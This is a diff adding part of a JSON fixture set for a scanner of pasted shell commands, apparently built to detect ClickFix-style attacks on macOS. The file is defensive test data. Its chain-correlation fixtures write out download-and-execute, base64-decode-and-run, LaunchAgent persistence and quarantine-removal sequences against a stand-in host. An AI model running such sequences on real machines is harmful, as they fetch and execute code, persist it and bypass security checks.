+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "crashfix_context",
+      "browser_to_terminal_transition"
+    ]
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-005",
+    "name": "Drive-by simulation 5",
+    "category": "driveby",
+    "description": "Drive-by simulation 5 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_5>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "browser_to_script_editor",
+      "applescript_url_scheme",
+      "shell_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "browser_to_script_editor",
+      "applescript_url_scheme",
+      "shell_execution"
+    ]
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-006",
+    "name": "Drive-by simulation 6",
+    "category": "driveby",
+    "description": "Drive-by simulation 6 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_6>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "unsigned_app_to_shell",
+      "quarantined_application_execution",
+      "network_stage"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "unsigned_app_to_shell",
+      "quarantined_application_execution",
+      "network_stage"
+    ]
+  },
+  {
+    "fixture_id": "CF-DRIVEBY-007",
+    "name": "Drive-by simulation 7",
+    "category": "driveby",
+    "description": "Drive-by simulation 7 supplied only as inert scanner data.",
+    "command_text": "<SIMULATED_DRIVEBY_7>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "drag_to_terminal",
+      "downloaded_file_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "Fake browser verification",
+      "Malvertising redirect"
+    ],
+    "notes": "No fixture content may be executed.",
+    "simulation": true,
+    "simulated_decision": "block",
+    "simulated_rule_ids": [
+      "drag_to_terminal",
+      "downloaded_file_execution"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-001",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_download_stage_execute",
+      "same_path_correlation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/fix -o /tmp/msaa-stage",
+      "chmod +x /tmp/msaa-stage",
+      "/tmp/msaa-stage"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-002",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_decode_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "printf '%s' 'cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic=' > /tmp/msaa-data",
+      "base64 -D /tmp/msaa-data > /tmp/msaa-script",
+      "zsh /tmp/msaa-script"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-003",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_downloaded_persistence"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/test.plist -o /tmp/msaa.plist",
+      "copy <SAFE_PLACEHOLDER> $HOME/Library/LaunchAgents/com.example.invalid.test.plist",
+      "launchctl bootstrap gui/TEST $HOME/Library/LaunchAgents/com.example.invalid.test.plist"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-004",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_security_bypass_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/app -o /tmp/example.invalid.app",
+      "xattr -d com.apple.quarantine /tmp/example.invalid.app",
+      "/tmp/example.invalid.app"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-005",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_network_decode_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/data -o /tmp/msaa-data",
+      "base64 -D /tmp/msaa-data > /tmp/msaa-script",
+      "eval <SAFE_DECODED_VARIABLE_PLACEHOLDER>"
+    ]
+  },
+  {
+    "fixture_id": "CF-BENIGN-001",
+    "name": "Benign control 001",
+    "category": "benign",
+    "description": "Benign control 001 supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/data.json -o /tmp/msaa-data.json",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-002",
+    "name": "Benign control 002",
+    "category": "benign",
+    "description": "Benign control 002 supplied only as inert scanner data.",
+    "command_text": "printf '%s' 'TVNBQV9URVNUCg==' | base64 -D",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-003",
+    "name": "Benign control 003",
+    "category": "benign",
+    "description": "Benign control 003 supplied only as inert scanner data.",
+    "command_text": "python3 -c 'print(\"MSAA test\")' ",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-004",
+    "name": "Benign control 004",
+    "category": "benign",
+    "description": "Benign control 004 supplied only as inert scanner data.",
+    "command_text": "osascript -e 'display notification \"MSAA test\"' ",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-005",
+    "name": "Benign control 005",
+    "category": "benign",
+    "description": "Benign control 005 supplied only as inert scanner data.",
+    "command_text": "chmod 600 /tmp/msaa-owned-test-file",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-006",
+    "name": "Benign control 006",
+    "category": "benign",
+    "description": "Benign control 006 supplied only as inert scanner data.",
+    "command_text": "xattr -l /tmp/example.invalid.app",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-007",
+    "name": "Benign control 007",
+    "category": "benign",
+    "description": "Benign control 007 supplied only as inert scanner data.",
+    "command_text": "launchctl list",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-008",
+    "name": "Benign control 008",
+    "category": "benign",
+    "description": "Benign control 008 supplied only as inert scanner data.",
+    "command_text": "security find-generic-password -s example.invalid",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-009",
+    "name": "Benign control 009",
+    "category": "benign",
+    "description": "Benign control 009 supplied only as inert scanner data.",
+    "command_text": "git clone https://example.invalid/repository.git",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-010",
+    "name": "Benign control 010",
+    "category": "benign",
+    "description": "Benign control 010 supplied only as inert scanner data.",
+    "command_text": "brew install example-package",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-011",
+    "name": "Benign control 011",
+    "category": "benign",
+    "description": "Benign control 011 supplied only as inert scanner data.",
+    "command_text": "example_function() { printf 'MSAA test\\n'; }",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-BENIGN-012",
+    "name": "Benign control 012",
+    "category": "benign",
+    "description": "Benign control 012 supplied only as inert scanner data.",
+    "command_text": "cat <<'JSON'\n{\"harmless\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}\nJSON",
+    "paste_origin": true,
+    "multiline": true,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "allow",
+    "minimum_score": 0,
+    "required_rule_ids": [],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  }
+]
